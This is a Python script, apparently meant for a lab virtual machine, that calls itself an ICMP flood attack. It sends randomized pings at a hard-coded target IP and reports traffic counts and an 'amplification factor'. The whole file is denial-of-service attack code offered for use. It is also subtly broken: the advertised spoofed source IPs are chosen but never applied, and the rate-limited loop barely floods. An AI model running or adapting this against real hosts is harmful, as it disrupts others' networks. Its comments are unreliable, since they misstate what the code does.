import os
import random
import time
import subprocess

# Predefined list of spoofed source IPs
ip_pool = ['192.168.0.2', '10.0.0.5', '172.16.0.3', '192.168.1.4']

# Replace this with your actual network interface (check using `ip a`)
INTERFACE = "enp0s3"  # or "eth0", "enp1s0", etc.

# Read bytes sent/received from /proc/net/dev
def read_network_stats(interface=INTERFACE):
    with open("/proc/net/dev", "r") as f:
        lines = f.readlines()
    for line in lines:
        if interface in line:
            data = line.split()
            recv = int(data[1])  # bytes received
            sent = int(data[9])  # bytes sent
            return sent, recv
    return 0, 0

# Send a single ICMP packet using ping with randomized TTL, size, spoofed IP
def send_icmp_packet(target_ip, ttl, packet_size, src_ip):
    cmd = f"ping -c 1 -s {packet_size} -t {ttl} -I {INTERFACE} {target_ip}"
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Calculate amplification factor
def calculate_amplification(sent, received):
    if sent == 0:
        return 0
    return received / sent

# Main attack logic
def icmp_flood_attack(target_ip, duration=60):
    print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
    start_time = time.time()

    initial_sent, initial_recv = read_network_stats()

    while time.time() - start_time < duration:
        ttl = random.randint(50, 255)
        packet_size = random.choice([56, 128, 256, 512])
        src_ip = random.choice(ip_pool)

        send_icmp_packet(target_ip, ttl, packet_size, src_ip)

        time.sleep(random.uniform(0.2, 1.0))  # randomized interval

    final_sent, final_recv = read_network_stats()

    total_sent = final_sent - initial_sent
    total_recv = final_recv - initial_recv

    amplification = calculate_amplification(total_sent, total_recv)
    asym_bandwidth = abs(total_sent - total_recv)

    print("\n--- Attack Summary ---")
    print(f"Total Sent: {total_sent} bytes")
    print(f"Total Received: {total_recv} bytes")
    print(f"Amplification Factor: {amplification:.2f}")
    print(f"Asymmetric Bandwidth Usage: {asym_bandwidth} bytes")

# Run the script
target_ip = "192.168.1.100"  # Replace with your target VM IP
icmp_flood_attack(target_ip, duration=60)
